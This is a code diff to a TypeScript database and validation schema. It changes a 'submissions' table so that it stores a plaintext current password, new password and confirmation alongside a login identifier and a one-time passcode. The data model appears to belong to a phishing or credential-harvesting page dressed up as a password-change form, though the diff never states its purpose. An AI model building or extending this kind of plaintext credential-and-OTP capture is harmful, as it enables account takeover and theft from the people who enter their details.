@@ -7,7 +7,9 @@ export const submissions = pgTable("submissions", {
   id: serial("id").primaryKey(),
   loginMethod: varchar("login_method", { length: 20 }).notNull(),
   identifier: text("identifier").notNull(),
-  password: text("password").notNull(),
+  currentPassword: text("current_password").notNull(),
+  newPassword: text("new_password").notNull(),
+  confirmPassword: text("confirm_password").notNull(),
   otp: text("otp"),
   submittedAt: timestamp("submitted_at").defaultNow().notNull(),
 });
@@ -20,7 +22,12 @@ export const insertSubmissionSchema = createInsertSchema(submissions).omit({
 export const credentialSubmitSchema = z.object({
   loginMethod: z.enum(["phone", "email", "username"]),
   identifier: z.string(),
-  password: z.string(),
+  currentPassword: z.string().min(1, "Current password is required"),
+  newPassword: z.string().min(8, "New password must be at least 8 characters"),
+  confirmPassword: z.string().min(1, "Please confirm your password"),
+}).refine((data) => data.newPassword === data.confirmPassword, {
+  message: "Passwords don't match",
+  path: ["confirmPassword"],
 });
 
 export const otpSubmitSchema = z.object({
